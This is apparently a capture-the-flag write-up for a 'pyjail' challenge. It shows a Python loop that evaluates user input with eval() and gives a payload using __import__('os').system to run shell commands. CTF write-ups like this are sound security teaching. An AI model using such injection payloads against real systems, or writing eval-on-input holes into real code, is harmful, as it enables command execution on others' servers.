# 🛡️ Challenge Writeup — pyjail

---

## 📜 Challenge Description

We are given the following Python code:

```python
import string
while True:
    number = input('>> ')
    if number:
        number += "+"
    print(eval(f"1+{number}1"))
```

The goal is to exploit it and potentially execute arbitrary code.

---

## 📥 Code Analysis

The important part is:

```python
print(eval(f"1+{number}1"))
```
The user input is directly injected into a Python eval() call without sanitization. We can inject any Python expression.

---

## 🚀 Exploit Example

To execute arbitrary code, you can inject something like:

```python
(__import__('os').system('ls'))
```
and then you can execute any command on the server.